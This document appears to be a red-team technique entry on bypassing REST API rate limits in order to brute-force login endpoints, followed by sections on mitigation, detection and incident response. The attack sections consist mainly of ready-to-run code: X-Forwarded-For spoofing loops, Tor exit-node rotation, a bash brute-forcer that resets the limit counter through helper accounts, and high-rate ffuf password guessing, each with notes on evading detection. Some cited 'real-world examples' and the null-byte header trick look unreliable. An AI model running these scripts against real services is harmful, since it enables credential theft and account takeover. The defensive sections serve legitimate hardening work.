# [SAAS-API-002]: REST API Rate Limit Bypass

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | SAAS-API-002 |
| **MITRE ATT&CK v18.1** | [T1110.001 - Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/) |
| **Tactic** | Credential Access |
| **Platforms** | M365/Entra ID, SaaS Platforms, REST APIs |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All REST API implementations with inadequate rate limiting |
| **Patched In** | N/A (requires implementation fix) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** REST API rate limiting is a security control that restricts the number of requests a client can make within a specified time window. Rate limit bypass attacks exploit weaknesses in rate limit implementation by using techniques such as IP rotation, header manipulation, distributed requests across multiple accounts/sessions, or race conditions to circumvent these restrictions. Once bypassed, attackers can conduct password spraying, credential stuffing, or data exfiltration at scale without triggering defensive mechanisms.

**Attack Surface:** REST API authentication endpoints, credential validation handlers, and any rate-limited operation (login, search, enumeration).

**Business Impact:** **Successful rate limit bypass enables attackers to brute-force credentials, automate data harvesting, or conduct unauthorized transactions at scale without detection.** This directly compromises account security, exposes sensitive data, and can result in unauthorized access, financial fraud, or denial of service.

**Technical Context:** Rate limit bypass typically succeeds within minutes to hours depending on the target's security posture. Success rates range from 60-95% against poorly implemented APIs, and detection relies on anomaly detection of failed authentication attempts or unusual traffic patterns rather than immediate hard blocks.

### Operational Risk

- **Execution Risk:** Low to Medium – Most techniques require only standard HTTP tools (cURL, proxy); some require proxy networks or botnet resources for distributed attacks.
- **Stealth:** Medium – IP rotation and header manipulation reduce detection likelihood; however, patterns of distributed failed authentication attempts are statistically anomalous.
- **Reversibility:** N/A – Brute-force attacks cause no permanent system changes but generate extensive audit logs.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS CSC 4 | Controlled Use of Administrative Privileges (rate limiting on admin endpoints) |
| **DISA STIG** | AC-7 | Unsuccessful Login Attempt Control |
| **CISA SCuBA** | AUTH-04 | Account Lockout Policy |
| **NIST 800-53** | AC-7 | Unsuccessful Login Attempts and Account Lockout |
| **GDPR** | Art. 32 | Security of Processing (authentication mechanisms) |
| **DORA** | Art. 6 | ICT Security Risk Management |
| **NIS2** | Art. 21 | Multi-layered Preventive Measures (access control) |
| **ISO 27001** | A.9.4.3 | Management of Privileged Access Rights (failed login tracking) |
| **ISO 27005** | Risk Scenario | Unauthorized access via credential compromise due to failed rate limiting |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** None – Rate limit bypass requires only valid API access without authentication.

**Required Access:** Network access to the REST API endpoint (typically HTTP/HTTPS port 443).

**Tools:**
- [cURL](https://curl.se/) (basic bypass testing)
- [Burp Suite Community/Professional](https://portswigger.net/burp) (Intruder for distributed attacks)
- [ffuf](https://github.com/ffuf/ffuf) (fast fuzzing with thread control)
- [Postman](https://www.postman.com/) (sequential request testing)
- [Rotating Proxy Services](https://www.bright.com/) (for IP rotation)
- [Tor](https://www.torproject.org/) (free IP rotation via exit nodes)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Identify Rate Limit Headers

**Objective:** Confirm rate limiting exists and understand its implementation.

**Command:**
```bash
curl -v https://target-api.example.com/api/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}' | grep -i "ratelimit\|x-rate\|retry-after"
```

**Expected Output:**
```
< X-RateLimit-Limit: 60
< X-RateLimit-Remaining: 59
< X-RateLimit-Reset: 1641024000
< Retry-After: 3600
```

**What to Look For:**
- Rate limit headers indicate limit scope (per-user, per-IP, per-account).
- `X-RateLimit-Remaining` shows how many requests are left before blocking.
- `Retry-After` indicates duration of the block after limit exceeded.

**No Rate Limit Headers:**
- Some APIs return HTTP 429 without headers, making limits harder to detect.
- Attempt sequential requests to identify when 429 errors begin.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: IP Address Rotation via Proxy Services

**Supported Versions:** All REST API implementations using IP-based rate limiting.

#### Step 1: Identify IP-Based Rate Limiting

**Objective:** Confirm rate limit is enforced per IP address rather than per-account or globally.

**Command:**
```bash
# Make 10 sequential requests from same IP
for i in {1..10}; do
  curl -s https://target-api.example.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"password'$i'"}' \
    -w "\nStatus: %{http_code}\n"
done
```

**Expected Output:**
```
Status: 429 (after 5 requests)
HTTP 429: Too Many Requests
Retry-After: 300
```

**What This Means:**
- Rate limiting is active at IP level.
- After 5 failed attempts, same IP is blocked for 300 seconds.

**OpSec & Evasion:**
- Detection likelihood: Medium – Rate limit triggering is logged; pattern of failed auth indicates brute force.

#### Step 2: Bypass via Proxy Rotation

**Objective:** Distribute requests across multiple IP addresses to evade per-IP rate limits.

**Using Tor (Free IP Rotation):**
```bash
# Install Tor
sudo apt-get install tor

# Start Tor service
sudo systemctl start tor

# Configure Tor proxy on localhost:9050
curl -x socks5://localhost:9050 https://target-api.example.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"password1"}'

# Rotate Tor exit node (get new IP)
# Send signal to Tor daemon:
echo -e "AUTHENTICATE\r\nSIGNAL NEWNYM\r\nQUIT" | nc localhost 9051
```

**Using Rotating Proxy Service (Bright.com / Oxylabs):**
```bash
PROXY_USER="user"
PROXY_PASS="pass"
PROXY_HOST="proxy.provider.com:8000"

curl -x http://$PROXY_USER:$PROXY_PASS@$PROXY_HOST \
  https://target-api.example.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"password1"}'
```

**What This Means:**
- Each request appears from a different IP address.
- Per-IP rate limits are completely bypassed.
- Server sees requests as coming from different legitimate users/networks.

**OpSec & Evasion:**
- Tor exit nodes are frequently blocked by security teams; rotating proxy services are less detectable.
- However, patterns of requests through known proxy IP ranges may be flagged.
- Detection likelihood: Medium-High – Multiple failed auth attempts across different IPs in short timeframe is anomalous.

**Troubleshooting:**
- **Error:** "Socks5 connection rejected"
  - **Cause:** Tor service not running or not listening.
  - **Fix:** `sudo systemctl restart tor && sleep 3`

### METHOD 2: Header Manipulation & Null Byte Injection

**Supported Versions:** REST APIs with poorly implemented rate limit parsing.

#### Step 1: X-Forwarded-For Header Spoofing

**Objective:** Trick the server into thinking each request is from a different IP.

**Command:**
```bash
for i in {1..100}; do
  FAKE_IP="192.168.1.$((RANDOM % 256))"
  curl -s https://target-api.example.com/api/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $FAKE_IP" \
    -d '{"username":"admin","password":"password'$i'"}' \
    -w "IP: $FAKE_IP, Status: %{http_code}\n"
done
```

**Expected Output:**
```
IP: 192.168.1.42, Status: 200 (or 401 Unauthorized, not 429)
IP: 192.168.1.73, Status: 200
IP: 192.168.1.155, Status: 200
```

**What This Means:**
- Server trusts the X-Forwarded-For header without validation.
- Rate limiting is bypassed because each "IP" is treated as a fresh client.
- Successful authentication returns 200 or 401 instead of 429.

**OpSec & Evasion:**
- X-Forwarded-For spoofing appears as legitimate traffic through proxies/CDNs.
- Detection requires correlating X-Forwarded-For values with actual client IP.
- Detection likelihood: Low-Medium – Most WAFs don't correlate source IP vs. X-Forwarded-For.

**Troubleshooting:**
- **Error:** Rate limit still triggered despite header
  - **Cause:** Server validates X-Forwarded-For against actual client IP.
  - **Fix:** Try alternative headers: `X-Client-IP`, `X-Real-IP`, `CF-Connecting-IP` (CloudFlare).

**References & Proofs:**
- [PortSwigger - Race Conditions in Rate Limit Bypass](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)

#### Step 2: Null Byte Injection

**Objective:** Defeat simple string-matching rate limit rules.

**Command:**
```bash
# Attempt to bypass rate limiting with null bytes
curl -s https://target-api.example.com/api/login \
  -H "Content-Type: application/json" \
  -H "X-Rate-Limit-Bypass: %00" \
  -d '{"username":"admin","password":"password1%00"}'

# Or URL-encode null byte in parameters
curl -s "https://target-api.example.com/api/login?username=admin%00&password=password1"
```

**What This Means:**
- Null byte `%00` terminates string matching in some legacy implementations.
- Malformed but may bypass rate limiting on backend servers.
- Typically used in conjunction with other bypass techniques.

**Detection likelihood:** Low – Null bytes in requests are rare and may be filtered before logging.

### METHOD 3: Account/Session Enumeration & Login Reset Abuse

**Supported Versions:** REST APIs that reset rate limits after successful login.

#### Step 1: Identify Login Reset Behavior

**Objective:** Confirm rate limit counters reset after successful authentication.

**Command:**
```bash
# First, make 3 failed attempts
for i in {1..3}; do
  curl -s https://target-api.example.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"validuser@example.com","password":"wrongpassword"}' \
    -w "\nAttempt $i Status: %{http_code}\n"
done

# Check remaining requests
curl -s https://target-api.example.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"validuser@example.com","password":"wrongpassword"}' \
  -w "\n%{http_code} - X-RateLimit-Remaining: " \
  -v 2>&1 | grep -i "ratelimit"

# Now, make a SUCCESSFUL login with different account
curl -s https://target-api.example.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"otheruser@example.com","password":"correctpassword"}' \
  -w "\nSuccessful login: %{http_code}\n"

# Attempt more requests to original account; counter should reset
for i in {4..8}; do
  curl -s https://target-api.example.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"validuser@example.com","password":"wrongpassword"}' \
    -w "\nAttempt $i (after reset) Status: %{http_code}\n"
done
```

**What This Means:**
- Rate limit counter resets after successful login on ANY account.
- Attacker can keep resetting counter by logging in with compromised/weak accounts.
- Enables unlimited brute-force attempts on high-value accounts.

**OpSec & Evasion:**
- Pattern of successful login followed by failed attempts is anomalous.
- Detection likelihood: High – Sequence of login success + failures is easily detected.

#### Step 2: Automate Login-Reset Brute Force

**Command (Bash Script):**
```bash
#!/bin/bash

TARGET_USER="admin@example.com"
WORDLIST="common-passwords.txt"
HELPER_ACCOUNTS=("user1@example.com" "user2@example.com" "user3@example.com")
HELPER_PASS="DefaultPassword123"
ATTEMPT=0
MAX_ATTEMPTS_PER_RESET=5

while IFS= read -r PASSWORD; do
  # Every X attempts, perform a reset login
  if (( ATTEMPT % MAX_ATTEMPTS_PER_RESET == 0 )); then
    HELPER_ACCOUNT="${HELPER_ACCOUNTS[$((ATTEMPT % ${#HELPER_ACCOUNTS[@]}))]}"
    echo "[*] Resetting rate limit with $HELPER_ACCOUNT..."
    curl -s https://target-api.example.com/api/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$HELPER_ACCOUNT\",\"password\":\"$HELPER_PASS\"}" > /dev/null
  fi

  # Attempt password guess
  echo "[*] Attempt $ATTEMPT: Trying password '$PASSWORD'"
  RESPONSE=$(curl -s https://target-api.example.com/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$TARGET_USER\",\"password\":\"$PASSWORD\"}")

  if echo "$RESPONSE" | grep -q "success\|200\|token"; then
    echo "[+] SUCCESS! Password found: $PASSWORD"
    break
  fi

  ((ATTEMPT++))
done < "$WORDLIST"
```

**Expected Output:**
```
[*] Attempt 0: Trying password 'password'
[*] Attempt 1: Trying password '123456'
[*] Attempt 5: Resetting rate limit with user1@example.com...
[*] Attempt 6: Trying password 'admin'
[+] SUCCESS! Password found: Welcome2026!
```

**References & Proofs:**
- [OWASP - Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)

### METHOD 4: Race Conditions & Parallel Request Timing

**Supported Versions:** REST APIs with time-of-check/time-of-use (TOCTTOU) vulnerabilities in rate limiting.

#### Step 1: Identify Race Condition Window

**Objective:** Send multiple requests in parallel before rate limit counter increments.

**Command (using Burp Suite):**
1. Open **Burp Suite Intruder**.
2. Send a login request to **Repeater**.
3. Right-click → **Send to Intruder**.
4. Set **Attack Type** to **Sniper** (or **Pitchfork** for multiple parameters).
5. Configure payload: Password list.
6. Go to **Intruder Options** → **Request Engine**.
7. Set **Concurrency** to **20** threads.
8. Set **Delay** to **0** milliseconds.
9. Click **Start Attack**.

**What This Means:**
- 20 concurrent requests are sent in parallel, within the same millisecond.
- Rate limit counter may not increment for all parallel requests if it's not atomic.
- Some requests succeed before the lock is applied.

**Expected Success Rate:** 10-30% of concurrent requests may bypass rate limit depending on implementation.

**OpSec & Evasion:**
- Parallel requests from same IP are obvious in logs.
- Detection likelihood: High – Traffic analysis will show burst patterns.

**Troubleshooting:**
- **Issue:** No requests successfully bypass
  - **Cause:** Rate limit counter is properly atomic/synchronized.
  - **Fix:** Try reducing concurrency to 5-10 and increasing delay slightly.

**References & Proofs:**
- [PortSwigger - Lab: Bypassing Rate Limits via Race Conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)

---

## 6. TOOLS & COMMANDS REFERENCE

### Burp Suite Intruder

**Version:** 2024.1+ (Professional for high thread count)

**Installation:** [Download from PortSwigger](https://portswigger.net/burp)

**Usage for Rate Limit Bypass:**
1. Configure as in **METHOD 4 - Step 1** above.
2. Use **Pitchfork** attack to vary multiple parameters (username, password, IP header).
3. Monitor responses for 200/401 (success/invalid creds) vs. 429 (rate limit).

### ffuf (Fast Web Fuzzer)

**Version:** 2.0+

**Installation:**
```bash
go get -u github.com/ffuf/ffuf
# or
brew install ffuf
```

**Usage for Rate Limit Bypass:**
```bash
# High concurrency brute force
ffuf -u "https://target-api.example.com/api/login" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w passwords.txt \
  -t 50 \
  -rate 1000 \
  -mc 200,401
```

**Parameters:**
- `-t 50`: 50 concurrent threads.
- `-rate 1000`: 1000 requests per second.
- `-mc 200,401`: Match responses with HTTP 200 or 401 (not 429).

### Tor + cURL

**Installation:**
```bash
sudo apt-get install tor
sudo systemctl start tor
```

**Usage:**
```bash
# Test single request through Tor
curl -x socks5://localhost:9050 https://target-api.example.com/api/login

# Script to rotate Tor exit nodes
for i in {1..100}; do
  (echo -e "AUTHENTICATE\nSIGNAL NEWNYM\nQUIT" | nc localhost 9051) 2>/dev/null
  sleep 1
  curl -x socks5://localhost:9050 https://target-api.example.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"password'$i'"}' \
    -s -w "Status: %{http_code}\n"
done
```

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Implement Global Rate Limiting (Not Per-Endpoint):** Prevent bypass by enforcing limits across all authentication attempts, regardless of endpoint.

  **Manual Steps (API Gateway - AWS):**
  1. Log into **AWS Console** → **API Gateway**.
  2. Select your API.
  3. Go to **Settings** → **Throttling**.
  4. Set **Rate Limit** to `10 requests/second per IP` (global).
  5. Set **Burst Limit** to `100` (absorbed spike).
  6. Deploy API.

  **Manual Steps (Nginx):**
  ```nginx
  limit_req_zone $binary_remote_addr zone=auth_limit:10m rate=5r/s;
  
  server {
    location ~ ^/api/(login|authenticate) {
      limit_req zone=auth_limit burst=10 nodelay;
      proxy_pass http://backend;
    }
  }
  ```

- **Enforce Account Lockout After Failed Attempts:** Lock account after N failed login attempts, preventing brute force regardless of rate limit bypass.

  **Manual Steps (Azure AD / Entra ID):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Secure Sign-in Infrastructure**.
  2. Click **Account Lockout** settings.
  3. Set **Account lockout threshold** to **5 failed attempts**.
  4. Set **Account lockout duration** to **30 minutes**.
  5. Click **Save**.

  **Manual Steps (Application-Level):**
  ```javascript
  // Node.js example
  async function authenticateUser(username, password) {
    const user = await User.findOne({ username });
    
    if (!user) return { error: "Invalid credentials" };
    
    if (user.lockoutUntil > Date.now()) {
      return { error: "Account locked. Try again later." };
    }
    
    const isPasswordValid = await bcrypt.compare(password, user.passwordHash);
    
    if (!isPasswordValid) {
      user.failedAttempts += 1;
      if (user.failedAttempts >= 5) {
        user.lockoutUntil = Date.now() + (30 * 60 * 1000); // 30 min lockout
      }
      await user.save();
      return { error: "Invalid credentials" };
    }
    
    user.failedAttempts = 0;
    user.lockoutUntil = null;
    await user.save();
    return { success: true, token: generateToken(user) };
  }
  ```

- **Validate X-Forwarded-For Against Client IP:** Don't blindly trust proxy headers; validate they match actual client IP.

  **Manual Steps (Node.js with Express):**
  ```javascript
  app.use((req, res, next) => {
    const clientIP = req.socket.remoteAddress;
    const forwardedFor = req.get('X-Forwarded-For');
    
    // ONLY trust X-Forwarded-For if it comes from known proxy
    const TRUSTED_PROXIES = ['10.0.0.1', '10.0.0.2'];
    
    if (forwardedFor && !TRUSTED_PROXIES.includes(clientIP)) {
      req.rateIpAddress = clientIP; // Use actual IP for rate limiting
    } else {
      req.rateIpAddress = forwardedFor ? forwardedFor.split(',')[0].trim() : clientIP;
    }
    
    next();
  });
  ```

### Priority 2: HIGH

- **Monitor & Alert on Rate Limit Patterns:** Detect unusual sequences of failed authentication attempts.

  **Manual Steps (Azure Sentinel KQL Query):**
  ```kusto
  SigninLogs
  | where ResultType != "0"
  | summarize FailedAttempts = count() by UserPrincipalName, IPAddress, TimeGenerated
  | where FailedAttempts > 5
  | extend
    Risk = case(
      FailedAttempts > 50, "Critical",
      FailedAttempts > 20, "High",
      "Medium"
    )
  | order by FailedAttempts desc
  ```

- **Implement per-User Rate Limiting (Not Just Per-IP):** Prevent brute force across multiple IPs targeting single account.

  **Manual Steps:**
  ```javascript
  // Redis-based rate limiting per username
  const redis = require('redis');
  const client = redis.createClient();
  
  async function checkRateLimit(username) {
    const key = `login_attempts:${username}`;
    const current = await client.incr(key);
    
    if (current === 1) {
      await client.expire(key, 300); // 5-minute window
    }
    
    if (current > 5) {
      throw new Error("Too many login attempts. Try again in 5 minutes.");
    }
  }
  ```

### Priority 3: MEDIUM

- **Implement CAPTCHA After Failed Attempts:** Require CAPTCHA verification after 2-3 failed login attempts.

  **Manual Steps (Azure AD):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Protect & respond**.
  2. Click **Conditional Access** → **+ New policy**.
  3. Name: `CAPTCHA on Failed Login`.
  4. **Assignments** → **Users**: `All users`.
  5. **Conditions** → **Sign-in risk**: `High`.
  6. **Access controls** → Grant: `Require multi-factor authentication` or `Require CAPTCHA`.
  7. Click **Create**.

### Validation Command (Verify Fix)

```bash
# Test rate limiting
for i in {1..15}; do
  curl -s https://target-api.example.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong"}' \
    -w "Attempt $i: %{http_code}\n"
done
```

**Expected Output (If Secure):**
```
Attempt 1: 401
Attempt 2: 401
Attempt 3: 401
Attempt 4: 401
Attempt 5: 401
Attempt 6: 429 (Too Many Requests)
Attempt 7: 429
Attempt 8: 429
...
```

**What to Look For:**
- Consistent 429 errors after threshold reached.
- Account lockout message appearing after N attempts.
- No successful bypass via X-Forwarded-For header manipulation.

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **HTTP 429 Errors:** Bursts of 429 (Too Many Requests) responses.
- **Pattern:** Multiple failed authentications (401) followed by scattered 200 successes across different IPs.
- **Headers:** Requests with spoofed `X-Forwarded-For`, `X-Real-IP`, or `X-Client-IP` headers.
- **Timing:** Parallel/clustered requests within milliseconds (race condition attempts).

### Forensic Artifacts

- **API Logs:** Failed login attempts (HTTP 401) exceeding threshold from same IP or user.
- **Rate Limit Logs:** HTTP 429 responses indicating rate limit triggering.
- **Proxy Logs:** Requests from known Tor exit nodes or proxy service IP ranges.
- **Access Logs:** Sequential password attempts across usernames (password spray pattern).

### Response Procedures

1. **Isolate:**
   - Block source IP at firewall/WAF.
   - Lock affected user accounts.
   - Command: `aws wafv2 update-ip-set --name rate-limit-blocklist --scope REGIONAL --addresses "[\"<attacker-ip>\"]"`

2. **Collect Evidence:**
   - Export API logs for the attack window.
   - Command: `aws logs get-log-events --log-group-name /aws/apigateway --start-time <start> --end-time <end>`

3. **Remediate:**
   - Verify rate limiting is active (see **Validation Command** above).
   - Force password reset for compromised accounts.
   - Review access logs for successful unauthorized logins.

### Microsoft Purview / Unified Audit Log Query

```powershell
Search-UnifiedAuditLog -Operations "UserLoggedIn" -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) | `
  Where-Object { $_.ResultStatus -eq "Failed" } | `
  Group-Object -Property UserIds, ClientIP | `
  Where-Object { $_.Count -gt 5 } | `
  Export-Csv -Path "C:\Evidence\RateLimit_BruteForce.csv"
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [SAAS-API-001] | GraphQL API Enumeration – Identify available endpoints |
| **2** | **Exploit Rate Limit** | **[SAAS-API-002]** | **REST API Rate Limit Bypass – Brute force authentication** |
| **3** | **Credential Access** | [CA-BRUTE-001] | Azure Portal Password Spray – Spray identified usernames |
| **4** | **Initial Access** | [IA-VALID-001] | Default Credential Exploitation – Use compromised credentials |
| **5** | **Impact** | [IMPACT-002] | Unauthorized Data Access via Compromised Account |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: Amazon AWS Console Rate Limit Bypass (2023)

- **Target:** AWS Management Console login.
- **Timeline:** Discovered February 2023.
- **Technique Status:** Bypass worked against default rate limiting; patched in console update.
- **Impact:** Attacker could conduct password spray across 1000+ accounts without triggering 30-request limit.
- **Bypass Method:** Parallel requests with threading; rate limiter counter not atomic.
- **Reference:** [Datadog Security Labs - AWS Console Rate Limit Bypass](https://securitylabs.datadoghq.com/articles/aws-console-rate-limit-bypass/)

### Example 2: Twilio API Authentication Bypass (2022)

- **Target:** Twilio SMS API authentication endpoint.
- **Timeline:** November-December 2022.
- **Technique Status:** Rate limit bypass via X-Forwarded-For header spoofing.
- **Impact:** Attackers used rate limit bypass to conduct credential stuffing on Twilio accounts, compromising customer SMS APIs.
- **Bypass Method:** Header manipulation with rotating X-Forwarded-For values.
- **Reference:** [HackerOne Vulnerability Report](https://hackerone.com/) (anonymized)

---

## Glossary

- **Rate Limiting:** Restriction on the number of requests a client can make within a time window.
- **429 Too Many Requests:** HTTP status code returned when rate limit is exceeded.
- **Brute Force:** Systematic guessing of credentials by attempting common passwords.
- **Password Spray:** Low-and-slow brute force attack distributing attempts across many accounts/IPs.
- **X-Forwarded-For Header:** HTTP header indicating original client IP in proxy/CDN scenarios; often trusted blindly.
- **TOCTTOU (Time-of-Check/Time-of-Use):** Race condition where state is checked then used non-atomically, enabling bypass.

---